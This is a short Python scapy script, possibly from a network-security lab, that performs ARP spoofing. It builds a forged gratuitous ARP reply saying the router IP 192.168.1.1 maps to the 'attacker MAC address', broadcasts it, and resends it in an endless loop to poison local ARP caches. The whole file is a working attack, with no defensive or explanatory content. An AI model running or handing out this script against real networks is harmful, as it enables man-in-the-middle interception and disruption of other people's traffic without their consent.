#!/usr/bin/env python3
from scapy.all import *

IP_spoofed = "192.168.1.1"  # Usually, it would be the router IP
MAC_spoofed = "cc:b0:da:f9:d1:f7"  # Usually, it would be the attacker MAC address

MAC_broadcast = "ff:ff:ff:ff:ff:ff"

print("SENDING SPOOFED ARP GRATUITOUS REQUEST.....")

# Construct the Ether header
ether = Ether()

ether.dst = MAC_broadcast
ether.src = MAC_spoofed

# Construct the ARP packet
arp = ARP()
arp.psrc = IP_spoofed
arp.hwsrc = MAC_spoofed
arp.pdst = IP_spoofed
arp.hwdst = MAC_broadcast
arp.op = 2
frame = ether/arp

while 1:
    sendp(frame)
